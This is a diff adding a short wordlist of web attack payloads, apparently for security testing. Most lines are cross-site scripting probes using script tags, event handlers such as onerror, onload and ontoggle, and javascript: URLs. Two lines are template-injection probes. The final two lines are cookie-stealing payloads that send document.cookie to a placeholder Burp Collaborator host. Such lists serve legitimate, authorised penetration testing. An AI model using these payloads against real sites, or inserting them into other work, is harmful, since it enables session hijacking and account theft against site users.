@@ -1,0 +1,22 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+javascript:alert(1)
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)><option>1</option></select>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+{{7*7}}
+${7*7}
+<script>fetch('https://BURP_COLLABORATOR/?c='+document.cookie)</script>
+<img src=x onerror="fetch('https://BURP_COLLABORATOR/?c='+document.cookie)">
